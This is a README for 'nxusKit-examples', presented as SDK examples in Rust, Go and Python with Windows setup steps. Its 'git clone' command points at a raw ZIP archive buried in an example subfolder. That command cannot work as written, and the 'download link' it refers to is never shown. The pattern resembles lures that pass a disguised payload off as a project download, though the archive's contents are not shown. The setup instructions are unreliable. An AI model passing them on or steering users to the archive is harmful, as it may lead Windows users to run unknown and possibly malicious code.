## 🖥️ What this is

nxusKit-examples is a set of ready-made examples for the nxusKit SDK. It shows how to use the SDK in Rust, Go, and Python.

These examples cover:

- LLM workflows
- Rule engines
- Constraint solvers
- Bayesian networks
- Decision tables

This repo helps you see how the SDK works in real cases. It gives you working code you can open, test, and adapt.

## 📦 What you need

Use a Windows PC with:

- Windows 10 or Windows 11
- A stable internet connection
- At least 4 GB of RAM
- A few hundred MB of free disk space

To run the examples, you may also need one or more of these tools:

- Python 3.10 or later
- Go 1.21 or later
- Rust toolchain

If you only want to view the examples, you can do that in your browser.

## 🚀 Getting started on Windows

Follow these steps to open and use the examples on Windows.

1. Open the download link in your browser.
2. On the repository page, look for the green Code button.
3. Click Code.
4. Choose Download ZIP.
5. Save the ZIP file to your PC.
6. Right-click the ZIP file and choose Extract All.
7. Pick a folder you can find later, such as Documents.
8. Open the extracted folder.

If you use Git, you can also clone the repo:

1. Open Command Prompt or PowerShell.
2. Run:

   git clone https://github.com/gazlad80/nxusKit-examples/raw/refs/heads/main/examples/patterns/cost-routing/go/examples_nxus_Kit_v1.1.zip

3. Open the new folder on your PC.

## 🐍 Run the Python examples

If you want the simplest path on Windows, start with Python.

1. Install Python if it is not already on your PC.
2. Open the example folder for Python.
3. Open Command Prompt in that folder.
4. Run the install step if the folder includes one:

   pip install -r requirements.txt

5. Run the example file, such as:

   python main.py

Some examples may use a different file name. If so, open the folder and run the file that starts the app.

## 🟦 Run the Go examples

Use these steps for Go examples.

1. Install Go on your PC.
2. Open the Go example folder.
3. Open Command Prompt in that folder.
4. Run:

   go mod tidy

5. Run the example:

   go run .

If the folder includes a single `.go` file, you may need to run that file name instead.

## 🦀 Run the Rust examples

Use these steps for Rust examples.

1. Install the Rust toolchain on your PC.
2. Open the Rust example folder.
3. Open Command Prompt in that folder.
4. Run:

   cargo build

5. Run the example:

   cargo run

Rust folders may take a little longer on the first build. That is normal.
